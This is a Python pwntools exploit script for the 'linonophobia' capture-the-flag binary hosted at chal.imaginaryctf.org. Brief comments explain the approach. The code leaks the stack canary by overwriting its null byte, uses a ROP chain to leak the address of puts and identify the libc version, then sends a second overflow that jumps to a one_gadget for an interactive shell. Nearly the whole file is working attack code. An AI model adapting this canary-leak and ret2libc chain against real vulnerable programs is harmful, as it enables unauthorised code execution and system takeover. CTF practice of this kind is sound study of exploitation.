# https://www.programmersought.com/article/57675557942/
# https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address
# https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc
#
# ret2libc, after figuring out the canary
# the binary replaces printf with puts
# which doesn't have a format string problem, but will print a string until a null byte
# canary's lowest byte is \x00, so overwrite it with \n and get the canary
#
# get the address of puts using puts, then figure out
# which version of libc the server has with libc.blukat.me
#
# 3 versions seem likely; try all
# get the shell gadget using one_gadget for all three;
# get libc base address using the puts offset;
# the output from one_gadget requires r12 and r15 to be null
#
# finally send the payload.


from pwn import *

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc6_2.31-0ubuntu9_amd64.so')
libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so')
#libc = ELF('./libc6_2.31-0ubuntu9.2_amd64.so')
elf = ELF('./linonophobia')
r = ROP(elf)

PUTS_GOT = elf.got['puts']
PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']
POP_RDI = (r.find_gadget(['pop rdi', 'ret']))[0]
POP_R12_15 = (r.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret']))[0]
binsh = 0xe6c7e # from one_gadget; requires r12, r15 to be NULL
#binsh = 0xe6aee # libc...ubuntu9_amd64.so

p = remote('chal.imaginaryctf.org', 42006)
#p = process('./linonophobia')
#gdb = gdb.attach(p)
p.recvline()
p.sendline(b'a'*0x108)
p.recvuntil(b'a'*0x108 + b'\n')
canary = u64(p.recv(7).rjust(8,b'\x00'))
print("canary=>" + hex(canary))
print(p.clean())

payload = b'a'*0x108 + p64(canary) + b'a'*8+ p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
p.sendline(payload)
rcv = p.recvline().strip()
puts_addr = u64(rcv.ljust(8,b"\x00"))
print("puts_addr=>" + hex(puts_addr))
print(p.clean())

libc_base = puts_addr - libc.symbols['puts']
binsh = libc_base + binsh

payload = b'a'*0x108 + p64(canary) + b'a'*8 + p64(POP_R12_15) + b'\x00'*32 + p64(binsh)
print(payload)
p.send(payload)
p.recvline()

print("========shell========")
p.send(payload)
p.clean()
p.interactive()

